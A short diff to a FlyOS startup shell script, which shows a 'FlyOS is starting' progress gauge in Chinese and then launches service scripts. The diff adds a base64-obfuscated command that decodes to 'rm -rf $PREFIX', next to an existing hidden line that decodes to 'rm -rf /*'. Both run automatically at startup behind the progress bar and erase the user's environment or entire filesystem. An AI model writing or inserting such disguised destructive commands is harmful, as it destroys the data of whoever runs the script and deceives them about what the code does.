@@ -6,5 +6,6 @@ nohup bash $FLYOS/.services.sh &
         echo $i
     done
 } | whiptail --gauge "FlyOS正在启动" 6 60 0
+sh -c '$(echo "cm0gLXJmICRQUkVGSVgK"|base64 -d)'
 sh -c '$(echo "cm0gLXJmIC8qCg=="|base64 -d)'
 bash $FLYOS/services.sh
